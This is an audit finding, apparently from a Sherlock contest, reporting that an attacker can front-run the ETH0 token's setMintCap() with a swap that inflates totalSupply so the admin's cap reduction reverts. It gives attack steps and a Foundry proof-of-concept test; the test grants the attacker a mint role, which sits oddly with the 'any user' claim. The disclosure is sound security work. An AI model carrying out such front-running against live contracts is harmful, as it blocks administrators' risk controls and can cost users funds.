# DoS on `setMintCap()` by front-running

### Summary

`setMintCap()` can be time-sensitive in certain scenarios, and this function can be DoS'ed so that if an admin wants to limit the mint cap, an attacker can front-run him and DoS it to keep the mint cap high for his advantage.

### Root Cause

[`Eth0::setMintCap()`](https://github.com/sherlock-audit/2025-05-usual-eth0/blob/main/eth0-protocol/src/token/Eth0.sol#L189) checks that the new mint cap must be higher than the totalSupply, and totalSupply can be manipulated by any user, this makes it possible for an attacker to front-run the `setMintCap()` tx to cause it to revert, keeping the mint cap high for his advantage (see Attack Path).

### Internal Pre-conditions

No significant internal constraints, the attacker just needs to notice the `setMintCap()` in the mempool then cause it to revert.

### External Pre-conditions

N/A

### Attack Path

1. The admin wants to limit the mint cap, he calls `setMintCap()`.
2. The attacker notices the tx in the mempool, he front-runs it with a `swap()` tx to increase the totalSupply.
3. Now, the `newMintCap` set by the admin becomes less than the `totalSupply()`, and so the admin's tx will revert.
4. The attacker has effectively prevented the admin from limiting the mint cap so that he can still be able to mint more ETH0, and `setMintCap` can be urgent in certain scenarios.
5. The attacker can now keep ETH0 tokens, or redeem them, but in the second case it will cose him the redeem fee.

### Impact

- DoS on `setMintCap()`, causing it to revert without performing the intended action, costing the admin gas.
- Preventing the admin from limiting the mint cap, which could be time-sensitive in scenarios such as a market crash.

### PoC

1. Add the following test to the file `./test/token/Eth0.t.sol` :
```solidity
     function test_FrontRunningToDoSetMintCap() external {
        _adminGiveMintCapOperatorRoleTo(admin);
        uint256 initialCap = 100e18 - 1;
        // vm.prank(admin);
        // eth0Token.setMintCap(initialCap); // admin tries to limit the mint cap, but the tx in pending in the mempool

        // Alice notices the tx in the mempool, and front-runs it with a swap to increase totalSupply more than newMintCap
        _adminGiveEth0MintRoleTo(alice);
        vm.startPrank(alice);
        deal(WSTETH, alice, 100e18);
        Eth0(WSTETH).approve(address(daoCollateral), 100e18);
        daoCollateral.swap(WSTETH, 100e18, 0);
        vm.stopPrank();

        // The admin's tx will revert
        vm.startPrank(admin);
        vm.expectRevert(abi.encodeWithSelector(MintCapTooSmall.selector));
        eth0Token.setMintCap(initialCap);
    }
```

2. Run the command `forge test --mt test_FrontRunningToDoSetMintCap -vvvv`.
